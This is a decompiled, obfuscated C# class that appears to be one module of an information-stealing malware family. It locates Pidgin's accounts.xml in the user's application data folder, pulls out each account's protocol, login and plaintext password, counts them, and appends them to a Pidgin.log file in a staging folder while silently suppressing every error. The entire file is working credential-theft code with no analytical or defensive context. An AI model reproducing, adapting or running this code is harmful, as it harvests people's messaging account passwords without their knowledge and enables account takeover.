using System;
using System.IO;
using System.Text;
using System.Xml;

// Token: 0x0200004F RID: 79
internal class Class18
{
	// Token: 0x06000222 RID: 546 RVA: 0x000051DC File Offset: 0x000033DC
	public static void smethod_0(string string_1)
	{
		if (File.Exists(Class18.string_0))
		{
			Directory.CreateDirectory(string_1 + "\\Jabber\\Pidgin\\");
			Class18.smethod_1(Class18.string_0, string_1 + "\\Jabber\\Pidgin\\Pidgin.log");
		}
	}

	// Token: 0x06000223 RID: 547 RVA: 0x00010F24 File Offset: 0x0000F124
	public static void smethod_1(string string_1, string string_2)
	{
		try
		{
			if (File.Exists(string_1))
			{
				try
				{
					XmlDocument xmlDocument = new XmlDocument();
					xmlDocument.Load(new XmlTextReader(string_1));
					foreach (object obj in xmlDocument.DocumentElement.ChildNodes)
					{
						XmlNode xmlNode = (XmlNode)obj;
						string innerText = xmlNode.ChildNodes[0].InnerText;
						string innerText2 = xmlNode.ChildNodes[1].InnerText;
						string innerText3 = xmlNode.ChildNodes[2].InnerText;
						if (string.IsNullOrEmpty(innerText) || string.IsNullOrEmpty(innerText2) || string.IsNullOrEmpty(innerText3))
						{
							break;
						}
						Class18.stringBuilder_0.AppendLine("Protocol: " + innerText);
						Class18.stringBuilder_0.AppendLine("Login: " + innerText2);
						Class18.stringBuilder_0.AppendLine("Password: " + innerText3 + "\r\n");
						Class18.uGwrzbZsuw++;
						Class18.int_0++;
					}
					if (Class18.stringBuilder_0.Length > 0)
					{
						try
						{
							File.AppendAllText(string_2, Class18.stringBuilder_0.ToString());
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x06000224 RID: 548 RVA: 0x0000446C File Offset: 0x0000266C
	public Class18()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}

	// Token: 0x06000225 RID: 549 RVA: 0x00005210 File Offset: 0x00003410
	// Note: this type is marked as 'beforefieldinit'.
	static Class18()
	{
		Class40.gcO0h7LzslQIW();
		Class18.int_0 = 0;
		Class18.uGwrzbZsuw = 0;
		Class18.string_0 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".purple\\accounts.xml");
		Class18.stringBuilder_0 = new StringBuilder();
	}

	// Token: 0x040000FA RID: 250
	public static int int_0;

	// Token: 0x040000FB RID: 251
	public static int uGwrzbZsuw;

	// Token: 0x040000FC RID: 252
	private static readonly string string_0;

	// Token: 0x040000FD RID: 253
	private static StringBuilder stringBuilder_0;
}
